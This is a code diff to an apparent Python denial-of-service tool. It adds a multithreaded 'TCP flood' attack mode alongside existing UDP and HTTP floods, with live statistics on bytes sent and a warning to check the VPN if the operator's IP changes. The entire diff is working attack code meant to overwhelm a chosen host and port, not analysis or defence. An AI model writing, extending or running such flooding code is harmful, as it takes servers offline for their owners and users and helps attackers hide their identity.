@@ -8,9 +8,11 @@ import threading
 import time
 import urllib.request
 import subprocess
+import math
 from dataclasses import dataclass, field
 from datetime import datetime
 from optparse import OptionParser
+from os import urandom as randbytes
 
 
 # Constants
@@ -48,6 +50,7 @@ class Context:
     packets_sent: int = 0
     connections_success: int = 0
     connections_success_prev: int = 0
+    packets_sent_prev: int = 0
     connections_failed: int = 0
     connections_check_time: int = 0
     errors: list[str] = field(default_factory=list)
@@ -142,12 +145,7 @@ def down_it_udp(_ctx: Context):
                 thread.daemon = True
                 thread.start()
 
-        lock.acquire()
-        if not _ctx.show_statistics:
-            thread = threading.Thread(target=show_statistics, args=[_ctx])
-            thread.daemon = True
-            thread.start()
-        lock.release()
+        show_statistics(_ctx)
         time.sleep(.01)
 
 
@@ -166,11 +164,34 @@ def down_it_http(_ctx: Context):
             # print('\033[92m HTTP-Request was done \033[0;0m')
 
         _ctx.packets_sent += 1
+        show_statistics(_ctx)
+        time.sleep(.01)
 
-        if not _ctx.show_statistics:
-            _ctx.show_statistics = True
+
+def down_it_tcp(_ctx: Context):
+    """TCP flood."""
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.SOL_TCP)
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            sock.settimeout(5)
+            sock.connect((_ctx.host, _ctx.port))
+            _ctx.connections_success += 1
+            while True:
+                try:
+                    bytes_to_send_len = _ctx.max_random_packet_len if _ctx.random_packet_len else 1024
+                    bytes_to_send = randbytes(_ctx.max_random_packet_len)
+                    sock.send(bytes_to_send)
+                    time.sleep(.01)
+                except:
+                    sock.close()
+                    break
+                else:
+                    _ctx.packets_sent += bytes_to_send_len
+                    show_statistics(_ctx)
+        except:
+            _ctx.connections_failed += 1
             show_statistics(_ctx)
-            _ctx.show_statistics = False
 
         time.sleep(.01)
 
@@ -266,7 +287,7 @@ def show_info(_ctx: Context):
     logo()
 
     my_ip_masked = get_first_ip_part(_ctx.start_ip)
-    is_random_packet_len = _ctx.attack_method == 'udp' and _ctx.random_packet_len
+    is_random_packet_len = _ctx.attack_method in ('tcp', 'udp') and _ctx.random_packet_len
 
     your_ip = f'\033[94m{my_ip_masked}\033[0m'
     check_vpn = f'\033[91mIP was changed, check VPN (current IP: {my_ip_masked})\033[0m' if _ctx.current_ip and _ctx.current_ip != _ctx.start_ip else ''
@@ -293,41 +314,67 @@ def show_info(_ctx: Context):
 
 def show_statistics(_ctx: Context):
     """Prints statistics to console."""
-    _ctx.show_statistics = True
+    if not _ctx.show_statistics:
+        _ctx.show_statistics = True
 
-    lock.acquire()
-    if not _ctx.getting_ip:
-        t = threading.Thread(target=set_current_ip, args=[_ctx])
-        t.start()
-    lock.release()
+        lock.acquire()
+        if not _ctx.getting_ip:
+            t = threading.Thread(target=set_current_ip, args=[_ctx])
+            t.start()
+        lock.release()
 
-    check_successful_connections(_ctx)
-    # cpu_load = get_cpu_load()
+        if _ctx.attack_method == 'tcp':
+            check_successful_tcp_attack(_ctx)
+        else:
+            check_successful_connections(_ctx)
+        # cpu_load = get_cpu_load()
 
-    print("\033c")
-    show_info(_ctx)
+        print("\033c")
+        show_info(_ctx)
 
-    connections_success = f'\033[92m{_ctx.connections_success}\033[0;0m'
-    connections_failed = f'\033[91m{_ctx.connections_failed}\033[0;0m'
+        connections_success = f'\033[92m{_ctx.connections_success}\033[0;0m'
+        connections_failed = f'\033[91m{_ctx.connections_failed}\033[0;0m'
 
-    curr_time = datetime.now() - _ctx.start_time
+        curr_time = datetime.now() - _ctx.start_time
 
-    print(f'Duration:                   {str(curr_time).split(".", 2)[0]}')
-    # print(f'CPU Load Average:           {cpu_load}')
-    print(f'Packets Sent:               {_ctx.packets_sent}')
-    print(f'Connection Success:         {connections_success}')
-    print(f'Connection Failed:          {connections_failed}')
-    print('------------------------------------------------------')
+        print(f'Duration:                   {str(curr_time).split(".", 2)[0]}')
+        # print(f'CPU Load Average:           {cpu_load}')
+        if _ctx.attack_method == 'http':
+            print(f'Requests sent:               {_ctx.packets_sent}')
+        elif _ctx.attack_method == 'tcp':
+            size_sent = convert_size(_ctx.packets_sent)
+            if _ctx.packets_sent == 0:
+                size_sent = f"\033[91m{size_sent}\033[0;0m"
+            else:
+                size_sent = f"\033[94m{size_sent}\033[0m"
 
-    if _ctx.errors:
-        print('\n\n')
-    for error in _ctx.errors:
-        print(f"\033[91m{error}\033[0;0m\n")
-        print('\007')
+            print(f'Total Packets Sent Size:    {size_sent}')
+        else:  # udp
+            print(f'Packets Sent:               {_ctx.packets_sent}')
+        print(f'Connection Success:         {connections_success}')
+        print(f'Connection Failed:          {connections_failed}')
+        print('------------------------------------------------------')
 
-    sys.stdout.flush()
-    time.sleep(3)
-    _ctx.show_statistics = False
+        if _ctx.errors:
+            print('\n\n')
+        for error in _ctx.errors:
+            print(f"\033[91m{error}\033[0;0m\n")
+            print('\007')
+
+        sys.stdout.flush()
+        time.sleep(3)
+        _ctx.show_statistics = False
+
+
+def convert_size(size_bytes: int) -> str:
+    """Converts size in bytes to human format."""
+    if size_bytes == 0:
+        return "0B"
+    size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
+    i = int(math.floor(math.log(size_bytes, 1024)))
+    p = math.pow(1024, i)
+    s = round(size_bytes / p, 2)
+    return "%s %s" % (s, size_name[i])
 
 
 def get_cpu_load():
@@ -347,6 +394,8 @@ def create_thread_pool(_ctx: Context) -> list:
     for i in range(int(_ctx.threads)):
         if _ctx.attack_method == 'http':
             thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
+        elif _ctx.attack_method == 'tcp':
+            thread_pool.append(threading.Thread(target=down_it_tcp, args=[_ctx]))
         else:  # _ctx.attack_method == 'udp':
             thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))
 
@@ -384,6 +433,22 @@ def check_successful_connections(_ctx: Context):
                 _ctx.errors.append(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
     else:
         _ctx.connections_check_time = curr_ms
+        _ctx.connections_success_prev = _ctx.connections_success
+        if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG in _ctx.errors:
+            _ctx.errors.remove(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
+
+
+def check_successful_tcp_attack(_ctx: Context):
+    """Checks if there are changes in sended bytes count."""
+    curr_ms = time.time_ns()
+    diff_sec = (curr_ms - _ctx.connections_check_time) / 1000000 / 1000
+    if _ctx.packets_sent == _ctx.packets_sent_prev:
+        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
+            if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG not in _ctx.errors:
+                _ctx.errors.append(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
+    else:
+        _ctx.connections_check_time = curr_ms
+        _ctx.packets_sent_prev = _ctx.packets_sent
         if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG in _ctx.errors:
             _ctx.errors.remove(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
 
@@ -398,8 +463,8 @@ def validate_input(args):
         print("\033[91mWrong threads number.\033[0m\n")
         return False
 
-    if args.attack_method not in ('udp', 'http'):
-        print("\033[91mWrong attack type. Possible options: udp, http.\033[0m\n")
+    if args.attack_method not in ('udp', 'tcp', 'http'):
+        print("\033[91mWrong attack type. Possible options: udp, tcp, http.\033[0m\n")
         return False
 
     return True
